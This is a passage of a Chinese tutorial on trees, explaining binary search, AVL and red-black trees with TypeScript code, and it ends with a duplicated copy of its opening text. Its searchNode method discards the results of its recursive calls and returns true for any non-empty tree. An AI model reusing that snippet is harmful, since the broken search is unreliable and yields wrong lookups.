一个节点的祖先包括父节点、祖父节点、曾祖父节点等。一个节点的后代包括子节点、孙子节点、曾孙节点等。\n\n    子树是树中非根节点和它的后代构成的。节点有个属性叫深度，节点的深度取决于它祖先节点的数量。树的高度取决于所有节点深度的最大值。\n\n\n# 二叉树\n\n    二叉树是一种一个节点最多有两个子节点的树，这两个子节点分别叫作：左侧子节点和右侧子节点。\n\n    二叉搜索树(BST)是二叉树中的一种，它的左侧子节点存储比父节点小的值，而右侧子节点存储比父节点大的值。\n\n    平衡二叉树(AVL)是特殊的二叉搜索树，特殊之处在于树中任何一个节点的左子树和右子树高度最多相差1。这样能避免树的某一分支出现很多层而其它分支却只有几层的现象（避免操作性能问题）。AVL树在添加或移除节点时会尽可能尝试转换为完全二叉树。\n\n    红黑树(RBT)是平衡二叉树的一种变体，它的左右子树高差有可能大于1（不一定要达到AVL式的平衡），所以它不是严格意义上的自平衡树。红黑树进行平衡的代价较低，其平均统计性能要强于AVL。（多增删少搜索用RBT，反之用AVL）\n\n\n# 二叉搜索树的实现\n\n    二叉搜索树的实现代码细节：binary-search-tree.ts\n\n\n# 实现二叉搜索树的准备工作\n\n    需要准备一个助手类Node，它有三个属性key、right、left，分别存储的是节点的值、节点的左侧子节点引用、节点的右侧子节点引用。\n\n    给BinarySearchTree声明一个变量_root，代表根节点，类型就是之前的Node。再声明一个变量_compareFn，用于存储比较函数。\n\n\n# 二叉搜索树的插入元素\n\n    insert向树中插入一个新的键。如果_root为null，证明此树为空，那么将新元素插入_root；否则，会与_root的值用_compareFn比较大小，比_root小的话再看_root的左侧子节点是否为空，为空就插入这个位置，不然又重复之前的逻辑比较大小...比_root大的话再看_root的右侧子节点是否为空，为空就插入这个位置，不然又重复之前的逻辑比较大小...这一样以来，完全可以用递归来实现它。\n\n/**\n * 向树中插入一个新的键\n */\npublic insert(key: T) {\n    if (this._root == null) { // 根节点为空\n        this._root = new Node<T>(key);\n    } else { // 插入到非根节点处需要比较大小才能插入\n        this.insertNode(this._root, key);\n    }\n}\n/**\n * 插入一个节点的左侧还是右侧，用比较函数来比较\n */\nprivate insertNode(node: Node<T>, key: T) {\n    if (this._compareFn(key, node.key) === Compare.LESS_THAN) { // 第一个参数小于第二个参数\n        if (node.left == null) {\n            node.left = new Node<T>(key);\n        } else {\n            this.insertNode(node.left, key);\n        }\n    } else {\n        if (node.right == null) {\n            node.right = new Node<T>(key);\n        } else {\n            this.insertNode(node.right, key);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 二叉搜索树的遍历\n\n# 中序遍历\n\n    中序遍历是一种上行顺序访问BST所有节点，也就是以“左侧子节点——父节点——右侧子节点”这样的形式遍历。\n\n/**\n * 通过中序遍历方式遍历所有节点\n */\npublic inOrderTraverse(callBack: Function) {\n    this.inOrderTraverseNode(this._root, callBack);\n}\n/**\n * 中序遍历\n */\nprivate inOrderTraverseNode(node: Node<T>, callBack: Function) {\n    if (node != null) {\n        this.inOrderTraverseNode(node.left, callBack);\n        callBack(node); // 在父节点就调用\n        this.inOrderTraverseNode(node.right, callBack);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 先序遍历\n\n    先序遍历是先访问该节点再访问其后代节点的顺序来遍历BST所有节点，也就是以“父节点——左侧子节点——右侧子节点”这样的形式遍历。\n\n/**\n * 通过先序遍历方式遍历所有节点\n */\npublic preOrderTraverse(callBack: Function) {\n    this.preOrderTraverseNode(this._root, callBack);\n}\n/**\n * 先序遍历\n */\nprivate preOrderTraverseNode(node: Node<T>, callBack: Function) {\n    if (node != null) {\n        callBack(node); // 在左节点之前就调用\n        this.preOrderTraverseNode(node.left, callBack);\n        this.preOrderTraverseNode(node.right, callBack);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 后序遍历\n\n    后序遍历是先访问后代节点再访问该节点的顺序来遍历BST所有节点，也就是以“左侧子节点——右侧子节点——父节点”这样的形式遍历。\n\n/**\n * 通过后序遍历方式遍历所有节点\n */\npublic postOrderTraverse(callBack: Function) {\n    this.postOrderTraverseNode(this._root, callBack);\n}\n/**\n * 后序遍历\n */\nprivate postOrderTraverseNode(node: Node<T>, callBack: Function) {\n    if (node != null) {\n        this.postOrderTraverseNode(node.left, callBack);\n        this.postOrderTraverseNode(node.right, callBack);\n        callBack(node); // 在右节点之后就调用\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二叉搜索树的最大值和最小值\n\n# 最大值\n\n    二叉搜索树的最大值就是树的最右侧的叶节点。其实就是从_root开始向右搜索，找到他们最右侧的子节点。\n\n/**\n * 二叉搜索树的最大值\n */\npublic max(): Node<T> {\n    return this.maxNode(this._root);\n}\n/**\n * 一直往右搜索找最大值\n */\nprivate maxNode(node: Node<T>): Node<T> {\n    let current: Node<T> = node;\n    while (current != null && current.right != null) {\n        current = current.right;\n    }\n    return current;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 最小值\n\n    二叉搜索树的最小值就是树的最左侧的叶节点。其实就是从_root开始向左搜索，找到他们最左侧的子节点。\n\n/**\n * 二叉搜索树的最小值\n */\npublic min(): Node<T> {\n    return this.minNode(this._root);\n}\n/**\n *  一直往左搜索找最小值\n */\nprivate minNode(node: Node<T>): Node<T> {\n    let current: Node<T> = node;\n    while (current != null && current.left != null) {\n        current = current.left;\n    }\n    return current;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二叉搜索树的查找元素\n\n    search，在树中查找一个键。如果节点存在，则返回true，否则返回false。从_root开始，使用_compareFn来比较大小，相等就返回true；比_root小的话，从左边搜索，比_root大的话，从右边搜索。又可以使用递归来解决这个问题。\n\n/**\n * 在树中查找一个键。如果节点存在，则返回true，否则返回false\n */\npublic search(key: T): boolean {\n    return this.searchNode(this._root, key);\n}\n/**\n * 判断当前节点是否与key相等，如果key小于node.key就向左边迭代查找，大于就向右边查找，相等就返回\n */\nprivate searchNode(node: Node<T>, key: T): boolean {\n    if (node == null) {\n        return false;\n    }\n    if (this._compareFn(key, node.key) === Compare.LESS_THAN) { // key比这个node的key小就往左边走\n        this.searchNode(node.left, key);\n    } else if (this._compareFn(key, node.key) === Compare.BIGGER_THAN) { // key比这个node的key大就往右边走\n        this.searchNode(node.right, key);\n    }\n    return true; // 直到相同就会返回true\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 二叉搜索树的移除元素\n\n    二叉搜索树中最复杂的方法remove，因为我们删除树中的某个节点时，可能还存留有它的子节点和子树，我们要考虑用哪个节点来替代它的位置。\n    当这个节点没有节点或者单纯只有一个子节点时，很好操作，没有子节点就不用管谁来替代它，只有一个子节点时就用这个子节点（包括子树）来替代它。\n    当它同时拥有左侧子节点和右侧子节点时，我们需要找出它右侧子树中最小的节点替代它（也就是值最接近它的节点来替代它）。但问题来了，这个替代的节点可能还有子树，所以我们不能单纯的移过去，需要从这个替代节点的父节点开始往下遍历删除这个替代的节点（也就是再调一次删除方法，来删除这个替代的节点）。     还有一点需要考虑，删除的这个节点，它的父节点里指向子节点的引用（指针）需要更新，因为你用新元素替代了它的子节点而引用还没更新。实现这点的方式就是，每次在替代完后都需要放回这个新节点，在迭代之前就用父节点里对应的引用来接收这个返回。\n\n/**\n * 从移除二叉搜索树中的删除一项\n */\npublic remove(key: T) {\n    this._root = this.removeNode(this._root, key); // 更新根节点\n}\n/**\n * 删除的这项，要考虑它的子节点\n * 如果它的左侧和右侧子节点同时存在就要考虑用谁来替代它原来的位置\n * 目前按照常理，找它后方最接近它的项来替代它的位置，并把“被用来替代的项”也要用removeNode删除\n */\nprivate removeNode(node: Node<T>, key: T): Node<T> {\n    if (node == null) {\n        return null;\n    }\n    if (this._compareFn(key, node.key) === Compare.LESS_THAN) { // key比这个node的key小就往左边走\n        node.left = this.removeNode(node.left, key); // 左侧子节点可能会变化，更新左侧子节点的引用（指针）\n        return node; // 更新父节点的引用（指针）\n    } else if (this._compareFn(key, node.key) === Compare.BIGGER_THAN) { // key比这个node的key大就往右边走\n        node.right = this.removeNode(node.right, key); // 右侧子节点可能会变化，更新右侧子节点的引用（指针）\n        return node; // 更新父节点的引用（指针）\n    } else { // 相等\n        // 没有左右侧子节点，直接删除\n        if (node.right == null && node.left == null) {\n            node = null;\n            return node; // 更新父节点的引用（指针）\n        }\n        if (node.right == null) { // 没有右侧子节点，而有左侧子节点，那么将左侧子节点替代它\n            node = node.left;\n            return node; // 更新父节点的引用（指针）\n        } else if (node.left == null) { // 没有左侧子节点，而有右侧子节点，那么将右侧子节点替代它\n            node = node.right;\n            return node; // 更新父节点的引用（指针）\n        }\n        /*\n            * 最特殊的情况，它有左侧子节点也有右侧子节点，删除它的话要选择合适的值替代它\n            * 删除一个值一般都是从后面寻找最接近它的项，在二叉搜索树中最接近节点的项就是它右侧节点中最小的那个\n            * 替代时，那个“被用来替代的项”也要删除，相当于用removeNode来迭代删除“被用来替代的项”\n            */\n        const aux: Node<T> = this.minNode(node.right);\n        node.key = aux.key; // 先替换这个值，下一步去删除引用\n        node.right = this.removeNode(node.right, aux.key); // 从右侧子节点开始删除那个“被用来替代的项”，并更新\n        return node; // 更新父节点的引用（指针）\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 平衡二叉树的实现\n\n    平衡二叉树的实现代码细节：avl-tree.ts\n\n\n# 节点的高度和平衡因子\n\n    节点的高度其实是该节点所形成的子树的高度（而子树的高度是子树上所有节点的深度最大值），一定要与节点的深度区分开来。节点的深度是向上遍历，看有多少层祖先，而节点的高度是向下遍历，看有多少层后代。\n\n    平衡因子是某个节点的左侧子树的高度（左侧子节点的高度）和右侧子树（右侧子节点的高度）的差值，在AVL中平衡因子只能是-1, 0, 1超过这些值的话需要旋转平衡。（最快的判断方法就是谁的左右两侧的层数超过了1）\n\n/**\n * 计算节点所在树的高度（从上往下计算）\n */\nprivate getNodeHeight(node: Node<T>): number {\n    if (node == null) {\n        return -1;\n    }\n    return Math.max(this.getNodeHeight(node.left), this.getNodeHeight(node.right)) + 1;\n}\n/**\n * 计算某个节点的平衡因子\n */\nprivate getBalanceFactor(node: Node<T>) {\n    // 左侧子树高度减去右侧子树高度\n    const heightDifference = this.getNodeHeight(node.left) - this.getNodeHeight(node.right);\n    switch (heightDifference) {\n        case -1:\n            return BalanceFactor.SLIGHTLY_UNBALANCED_RIGHT; // 平衡因子为1，右侧略微不平衡多1层\n        case 1:\n            return BalanceFactor.SLIGHTLY_UNBALANCED_LEFT; // 平衡因子为1，左侧略微不平衡多1层\n        case -2:\n            return BalanceFactor.UNBALANCED_RIGHT; // 平衡因子为-2，代表节点的右侧比左侧多2层\n        case 2:\n            return BalanceFactor.UNBALANCED_LEFT; // 平衡因子为2，代表节点的左侧比右侧多2层\n        default:\n            return BalanceFactor.BALANCED; // 左右完全平衡\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 平衡二叉树的平衡操作\n\n    向AVL树添加或移除节点后，需要计算出节点平衡因子，然后根据平衡因子来确定是否需要进行平衡操作。\n\n    新节点插入后，导致某个节点不平衡（平衡因子的绝对值达到了2），会形成了四种情况：\n        1.左-左(LL)：这个新节点是那个不平衡节点的左子树的左子树的叶节点。需要将不平衡节点进行右旋转就可以达到平衡。\n        2.右-右(RR)：这个新节点是那个不平衡节点的右子树的右子树的叶节点。需要将不平衡节点进行左旋转就可以达到平衡。\n        3.右-左(RL)：这个新节点是那个不平衡节点的右子树的左子树的叶节点。需要将不平衡节点的右节点进行右旋转然后将不平衡节点进行左旋转就可以达到平衡。\n        4.左-右(LR)：这个新节点是那个不平衡节点的左子树的右子树的叶节点。需要将不平衡节点的左节点进行左旋转然后将不平衡节点进行右旋转就可以达到平衡。\n\n/**\n * 左-左形式：需要右旋转\n * 将2插到5的左侧子节点，20那个节点将会不平衡，需要将20那\n * 个节点进行右旋转。15那个节点会挡住20那个节点，那么就需\n * 要先将15那个节点放到20那个节点的左侧子节点上，最后将20\n * 这个节点放到10这个节点的右侧子节点上，这样就完成了右旋\n * 转。\n * --------------------------------------------------\n *        20               10\n *       /  \\             /  \\\n *      10   25          5    20\n *     / \\       ——>    /     / \\\n *    5   15           2     15  25\n *   ^\n *  2\n * --------------------------------------------------\n */\nprivate rotationLL(node: Node<T>): Node<T> {\n    // 临时保存不平衡节点的左侧子树\n    const temp = node.left;\n    // node准备右旋转，而temp的right上有多余的节点\n    // 这个多余的节点可以移到node的left上\n    node.left = temp.right;\n    // 完成旋转也就是node会旋转到temp的right上\n    temp.right = node;\n    return temp;\n}\n/**\n * 右-右形式：需要左旋转\n * 将28插到25的右侧子节点，10那个节点将会不平衡，需要将10\n * 那个节点进行左旋转。15那个节点会挡住10那个节点，那么就\n * 需要先将15那个节点放到10那个节点的右侧子节点上，最后将\n * 10这个节点放到20这个节点的左侧子节点上，这样就完成了左\n * 旋转。\n * --------------------------------------------------\n *    10                    20\n *   /  \\                  /  \\\n *  5   20                10   25\n *      / \\       ——>    /  \\    \\\n *     15  25           5   15    28\n *          ^\n *           28\n * --------------------------------------------------\n */\nprivate rotationRR(node: Node<T>): Node<T> {\n    // 临时保存右侧子树（node.right）\n    const temp = node.right;\n    // node准备左旋转，而temp的left上有多余的节点\n    // 这个多余的节点可以移到node的right上\n    node.right = temp.left;\n    // 完成旋转也就是node会旋转到temp的left上\n    temp.left = node;\n    return temp;\n}\n/**\n * 左-右形式：先需要左旋转最后需要右旋转\n * 将18插到15的右侧子节点，20那个节点将会不平衡，需要将10\n * 那个节点进行左旋转，最后对20那个节点进行右旋转。\n * --------------------------------------------------\n *      20               20              15\n *     /  \\             /  \\            /  \\\n *    10   25          15   25         10   20\n *   / \\       ——>    /  \\      ——>   /    /  \\\n *  5   15           10  18          5    18   25\n *       ^          /\n *        18       5\n * --------------------------------------------------\n */\nprivate rotationLR(node: Node<T>): Node<T> {\n    // 对不平衡节点的左侧子节点进行左旋转\n    node.left = this.rotationRR(node.left);\n    // 对不平衡节点进行右旋转\n    return this.rotationLL(node);\n}\n/**\n * 右-左形式：先需要右旋转最后需要左旋转\n * 将13插到15的左侧子节点，10那个节点将会不平衡，需要将20\n * 那个节点进行右旋转，最后对10那个节点进行左旋转。\n * --------------------------------------------------\n *   10               10                  15\n *  /  \\             /  \\                /  \\\n * 5   20           5   15              10   20\n *     / \\     ——>      / \\     ——>    /  \\    \\\n *    15  25           13  20         5   13   25\n *    ^                     \\\n *   13                      25  \n * --------------------------------------------------\n */\nprivate rotationRL(node: Node<T>): Node<T> {\n    // 对不平衡节点的右侧子节点进行右旋转\n    node.right = this.rotationLL(node.right);\n    // 对不平衡节点进行左旋转\n    return this.rotationRR(node);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n\n\n    可以思考一下，左-右形式的能不能先右旋转再左旋转？右-左形式的能不能先左旋转再右旋转？\n\n/**\n * 左-右形式：先特殊右旋转最后正常左旋转\n * --------------------------------------------------\n *      20            10                 15\n *     /  \\          /  \\               /  \\\n *    10   25       5   15             10   20\n *   / \\       ——>     /  \\    ——>    /    /  \\\n *  5   15            13  20         5    18   25\n *      ^                   \\\n *     13                   25\n * --------------------------------------------------\n */\nprivate specialRotationLR(node: Node<T>): Node<T> {\n    // 进行特殊右旋转\n    node = this.specialRotationLL(node);\n    // 进行正常左旋转\n    return this.rotationRR(node);\n}\nprivate specialRotationRL(node: Node<T>): Node<T> {\n    // 进行特殊左旋转\n    node = this.specialRotationRR(node);\n    // 进行正常右旋转\n    return this.rotationLL(node);\n}\n/**\n * 使用temp.left.left的原因就是，新添的叶节点就在这一层\n * 而且左-右或右-左能保证temp.left不为空，而左-左或右-右\n * 就不能保证temp.left不为空，所以左-左和右-右还是使用的\n * 正常的旋转\n */\nprivate specialRotationRR(node: Node<T>): Node<T> {\n    const temp = node.right;\n    node.right = temp.left.left;\n    temp.left.left = node;\n    return temp;\n}\nprivate specialRotationLL(node: Node<T>): Node<T> {\n    const temp = node.left;\n    node.left = temp.right.right;\n    temp.right.right = node;\n    return temp;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n    左-右形式的能先右旋转再左旋转；右-左形式的能先左旋转再右旋转。但是没必要，因为这四种情景上有时还得使用正常的旋转，不然它可能会有不平衡的子树。\n\n\n# 自平衡树的插入节点\n\n    依然采用递归方法，去找寻适合的位置去插入，插入后新元素刚好在最底端，利用递归+return形式可以反过来检测元素是否平衡，不平衡再进行平衡操作。\n\n/**\n * 向树中插入一个新的键\n */\npublic insert(key: T) {\n    this._root = this.insertNode(this._root, key);\n}\n/**\n * 插入一个节点的左侧还是右侧，用比较函数来比较\n * 插入后还需要反过来对node进行平衡检查\n */\nprotected insertNode(node: Node<T>, key: T) {\n    if (node == null) {\n        return new Node<T>(key); // 直接return，新键也不需要对这个键作平衡操作\n    }\n    if (this._compareFn(key, node.key) === Compare.LESS_THAN) { // key小于node.key\n        node.left = this.insertNode(node.left, key); // 插左边\n    } else if (this._compareFn(key, node.key) === Compare.BIGGER_THAN) { // key大于node.key\n        node.right = this.insertNode(node.right, key); // 插右边\n    } else { // 键重复，无需插入\n        return node; // 直接return，键重复也不需要对这个键作平衡操作\n    }\n    const balanceFactor = this.getBalanceFactor(node); // node的平衡因子\n    if (balanceFactor === BalanceFactor.UNBALANCED_LEFT) { // node不平衡并且属于左边高\n        if (this._compareFn(key, node.left.key) === Compare.LESS_THAN) { // 新键在node的左子树的左子树上\n            node = this.rotationLL(node);\n        } else { // 新键在node的左子树的右子树上\n            node = this.rotationLR(node);\n        }\n    } else if (balanceFactor === BalanceFactor.UNBALANCED_RIGHT) { // node不平衡并且属于右边高\n        if (this._compareFn(key, node.right.key) === Compare.BIGGER_THAN) { // 新键在node的右子树的右子树上\n            node = this.rotationRR(node);\n        } else {\n            node = this.rotationRL(node);\n        }\n    }\n    return node; // 迭代结合return，反过来对每次的node进行平衡检查\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 自平衡树的移除节点\n\n    在父类的删除基础上添加平衡操作的逻辑。其实跟添加的逻辑也很类似，区别比较大的是在判断是单旋双旋上，新增可以拿新增元素和node的子节点比较，而删除需要判断node的子节点平衡因子来作判断。\n\n/**\n * 删除元素，重写父类的同名方法，会用到父类的逻辑再新增平衡操作的逻辑\n * 特殊之处：子类super调用父类同名方法，并且父类的那个方法递归调用自身。\n * 调用顺序就是子类removeNode方法——>父类removeNode方法——>递归调用子类\n * removeNode方法——>父类removeNode方法——>递归调用子类的removeNode方法，\n * 循环调用至边界条件。\n */\nprotected removeNode(node: Node<T>, key: T) {\n    node = super.removeNode(node, key);\n    if (node == null) {\n        return node; // 空的null不需要平衡\n    }\n    const balanceFactor = this.getBalanceFactor(node);\n    if (balanceFactor === BalanceFactor.UNBALANCED_LEFT) { // 左子树不平衡\n        // 左子树的左节点的平衡因子，如果这个平衡因子是0或者1，代表左子树是左-左型\n        const balanceFactorLeft = this.getBalanceFactor(node.left);\n        if (balanceFactorLeft === BalanceFactor.BALANCED ||\n            balanceFactorLeft === BalanceFactor.SLIGHTLY_UNBALANCED_LEFT) {\n            node = this.rotationLL(node);\n        } else if (balanceFactorLeft === BalanceFactor.SLIGHTLY_UNBALANCED_RIGHT) {\n            node = this.rotationLR(node);\n        }\n    } else if (balanceFactor === BalanceFactor.UNBALANCED_RIGHT) { // 右子树不平衡\n        // 右子树的右节点的平衡因子，如果这个平衡因子是0或者1，代表右子树是右-右型\n        const balanceFactorRight = this.getBalanceFactor(node.right);\n        if (balanceFactorRight === BalanceFactor.BALANCED ||\n            balanceFactorRight === BalanceFactor.SLIGHTLY_UNBALANCED_RIGHT) {\n            node = this.rotationRR(node);\n        } else if (balanceFactorRight === BalanceFactor.SLIGHTLY_UNBALANCED_LEFT) {\n            node = this.rotationRL(node);\n        }\n    }\n    return node;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n非常推荐去看一下AVL树的测试代码avl-tree.spec.ts，就算不运行它，也可以看一下里面的注释，包含AVL插入删除元素的实际例子推算！\n\n\n# 红黑树的实现\n\n    红黑树的实现代码细节：red-black-tree.ts\n\n    首先我们要明确红黑树的性质：\n        1.每个节点非黑即红\n        2.根节点是黑色的\n        3.空的叶节点都是黑色的\n        4.如果一个节点是红色的，那么它的父节点和子节点就只能是黑色的，也就是不能有连续的红色节点。\n        5.任意节点到它后代的叶节点的所有路径上，拥有相同数量的黑色节点。\n\n        对第3点解释一下，例如某个值为9的节点没有左子节点，其实9这个节点的左子节点就是个空节点也就是null（有些语言用nil描述的）；那么这个空节点相对于树来说就是空的叶节点。\n\n\n# 红黑树的插入节点\n\n    首先先规定新插入的元素是 红色 ，插入时可分为以下几个场景：\n场景1：红黑树是空树，新元素放到root上，其颜色置为黑色。\n场景2：插入的元素已经存在于红黑树了，不用插入该元素。\n场景3：新插入元素的父节点是黑色的，那么直接插入，无需进行红黑平衡。 违反性质5吗？没有，因为新插入的红色节点根本就不影响路径上黑色的数量。例如下图：新添元素9\n\n场景4：新插入元素的父节点是红色，违反性质4，需要进行红黑平衡。\n\n> 场景4.1：叔节点不存在。 先明确一下，新元素是红色，父节点是红色，那么祖父节点就是黑色，相应的这棵子树对外暴露的是黑色。例如下图：新添元素4，并且没有叔节点\n> \n>      方法一：采用对换颜色的方法，将父节点和祖父节点的颜色对调，那新子树对外暴露的是红色节点，这样可能会违反性质4，如果继续对换新的父节点和新的祖父节点的颜色，又违反性质5。例如下图：6和8颜色对换，但是8和10是连续的红色，违反性质4；10和12继续对换，又潍坊性质5.\n> \n>      方法二： 其实叔节点为空就类似AVL不平衡场景，那么需要根据对应的情景进行对应的旋转，还要保证旋转前后的顶点颜色要不变（对调父节点和祖父节点的颜色）。这样得到的子树对外暴露的依然是黑色节点，不违反性质4和性质5。例如下面4个图：分别是左-左、左-右、右-右、右-左\n> \n> 场景4.2：叔节点存在并且为红色。 按照以往的经验，直接去旋转再变换颜色。例如下图：最终不管是变色还是10和12都置为黑色，都无法同时满足性质4和性质5\n> \n> 所以直接将叔节点这一代与祖父节点对调颜色\n> \n> 场景4.3：叔节点存在并且为黑色。 这个情况比较特殊，它在进行一次平衡后要进行第二次平衡时才可能出现。而解决这种场景的方法，单纯要调换颜色不行还需要旋转才可以，例如下图：\n> \n> 不要认为就一种，其实跟4.1场景的第二种方法一样有四种也就是左-左、左-右、右-右、右-左情形。\n\n纵观这几个场景，其实可以整合一下。\n    叔节点存在并且为红色，直接对调父节点这一代和祖父节点的颜色。这课子树是平衡了，但祖父节点相对于其他子树可能还不平衡，需要将视角调到祖父节点上，然后继续检查是否平衡。\n    叔节点不存在或者叔节点存在并且为黑色，这两种场景的处理逻辑是一样的，先对调颜色，再进行旋转。这课子树是平衡了，并且相对于其他子树也是平衡的，不需要再继续检查平衡了。\n\n    文字和图可能还不懂，需要阅读实现代码red-black-tree.ts的insert方法，并且配上测试代码red-black-tree.spec.ts一起阅读最好。\n\n\n# 红黑树的移除节点\n\n    先不忙讨论黑红树的移除，先回顾一下 二叉树的移除 。二叉树的移除最后归结为三种情形：\n    情形1： 待删除节点下没有子节点，那么删除它以后，没有节点可以补上它的位置。\n    情形2： 待删除节点下只有一个子节点，那么删除它以后，那个子节点会补上它的位置。\n    情形3： 待删除节点下同时拥有左右子节点，那么删除它以后，会从右子树中找最小值节点补上它的位置，并会从右子树中删除那个最小值节点，这又会是新一轮删除（递归），但它有边界条件，它最终还是会落到前两种情形里。\n\n----------------------------------------\n\n    红黑树既然是继承自二叉树，那么它移除节点时也是上述三种情形，只是我们需要结合 红黑树的性质 来讨论。\n\n>     情形1： 待删除节点下没有子节点，那么删除它以后，没有节点可以补上它的位置。\n> \n> >     待删除节点可以是黑色也可以是红色。\n> >     如果是红色，删除时不会导致红黑树失衡；如果是黑色，删除时会导致红黑树失衡。\n> > 如下图：17、13被删除\n> \n>     情形2： 待删除节点下只有一个子节点，那么删除它以后，那个子节点会补上它的位置。\n> \n> >     由于只有一个子节点，根据红黑树性质5，这个子节点必然是红色的；又结合性质4，待删除节点必然是黑色的，并且那个红色子节点也必然没有后代。\n> >     删除时，红色子节点会补到被删除位置，颜色不变只替换数值，也不会影响平衡。最后再删除那个红色节点，相当于回到了情形1。\n> > 如图：17被删除\n> \n>     情形3： 待删除节点下同时拥有左右子节点，那么删除它以后，会从右子树中找最小值节点补上它的位置（颜色不变只替换数值），并会从右子树中删除那个最小值节点，这又会是新一轮删除（递归），但它有边界条件，它最终还是会落到前两种情形里。\n> 如下图：删除17，18会补上来，最后一轮删除其实就是情形1\n\n    初步结论：红黑树的情形3和情形2最终都会变成情形1，所以只需要研究情形1即可。而情形1中只需要对“待删除节点是黑色”这种情况进行讨论，要怎样处理才能让它恢复红黑平衡。\n\n----------------------------------------\n\n    我们需要对兄弟节点颜色进行分情况讨论，如下图：\n\n\n> 大致思路：\n>     节点删除后，兄弟节点这边会 多一层黑色，正常情况下，我们会先将兄弟节点这边的子节点这一层的 红色节点变为黑色节点，那么就 多出两层黑色的；那么再 将多出的其中一层黑色通过旋转借给删除节点那边，一般就会达到平衡了（新旧顶点颜色要一致）。\n>     但是 如果借过去的是一层红色（兄弟节点是红色）怎么办？不能再用“多出两层黑色”这种办法了，红色的借过去的同时其实兄弟节点的子节点也被借过去了，并且也是比删除节点那边多一层黑色，其实又回到这个问题了！用递归，直到借过去的是黑色就可以平衡了。\n> \n> 看图理解：\n> \n> \n> \n> 归纳总结：\n> \n> > 场景1：红黑树是空树或者找不到要删除的元素，那就无需删除。\n> > 场景2：删除的节点是根节点或者是红色节点，那就直接删除它，无需作红黑平衡。\n> > 场景3：删除的节点是黑色节点，需要作红黑平衡。\n> >     场景3.1：其兄弟节点为黑色，并且兄弟节点有至少一个红色子节点。将其中一个红色子节点变为黑色，对调兄弟节点和父节点的颜色，再旋转黑色借给“轻”的那一边。\n> >     场景3.2：其兄弟节点为黑色，并且兄弟节点下没有子节点或者有两个黑色子节点。如果父节点为红色，直接对调兄弟节点和父节点的颜色。如果父节点为黑色，将兄弟节点变为红色，再以父节点为视角，重复“场景3”的处理。\n> >     场景3.3：其兄弟节点为红色。先旋转，再以新的子树作为视角，重复“场景3”的处理。\n\n----------------------------------------\n\n    文字和图可能还不懂，需要阅读实现代码red-black-tree.ts的remove方法，并且配上测试代码red-black-tree.spec.ts一起阅读最好。\n\n----------------------------------------",normalizedContent:"# 树\n\n\n# 树数据结构\n\n    树(tree)是一种分层数据的抽象模型。一个树结构包含一系列存在父子关系的节点，每个节点都有一个父子节点（除了树顶部的根节点）以及零个或多个子节点。\n\n    树中的每个元素都叫作节点，节点分为内部节点和外部节点。至少有一个子节点的节点称为内部节点，没有子节点的节点称为外部节点或叶节点。\n\n    一个节点的祖先包括父节点、祖父节点、曾祖父节点等。一个节点的后代包括子节点、孙子节点、曾孙节点等。\n\n    子树是树中非根节点和它的后代构成的。节点有个属性叫深度，节点的深度取决于它祖先节点的数量。树的高度取决于所有节点深度的最大值。\n\n\n# 二叉树\n\n    二叉树是一种一个节点最多有两个子节点的树，这两个子节点分别叫作：左侧子节点和右侧子节点。\n\n    二叉搜索树(bst)是二叉树中的一种，它的左侧子节点存储比父节点小的值，而右侧子节点存储比父节点大的值。\n\n    平衡二叉树(avl)是特殊的二叉搜索树，特殊之处在于树中任何一个节点的左子树和右子树高度最多相差1。这样能避免树的某一分支出现很多层而其它分支却只有几层的现象（避免操作性能问题）。avl树在添加或移除节点时会尽可能尝试转换为完全二叉树。\n\n    红黑树(rbt)是平衡二叉树的一种变体，它的左右子树高差有可能大于1（不一定要达到avl式的平衡），所以它不是严格意义上的自平衡树。红黑树进行平衡的代价较低，其平均统计性能要强于avl。（多增删少搜索用rbt，反之用avl）\n\n\n# 二叉搜索树的实现\n\n    二叉搜索树的实现代码细节：binary-search-tree.ts\n\n\n# 实现二叉搜索树的准备工作\n\n    